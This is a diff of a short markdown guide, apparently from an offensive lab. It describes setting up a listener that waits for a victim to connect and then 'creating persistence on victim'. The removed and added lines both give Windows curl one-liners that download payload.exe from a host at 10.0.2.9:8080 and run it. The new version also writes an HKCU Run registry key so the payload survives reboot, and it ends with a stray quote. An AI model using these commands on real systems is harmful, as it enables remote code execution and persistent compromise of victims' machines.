@@ -27,8 +27,8 @@ Setup Listener
 
  Waits for victim connection.
 
-## Install payload for Startup and run it immediately
+## Create Persistence on Victim
 
 ```
-curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\background.exe" http://10.0.2.9:8080/payload.exe && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\background.exe"
+curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe" http://10.0.2.9:8080/payload.exe && reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Background /t REG_SZ /d "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe" && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Maintenance\background.exe""
 ```
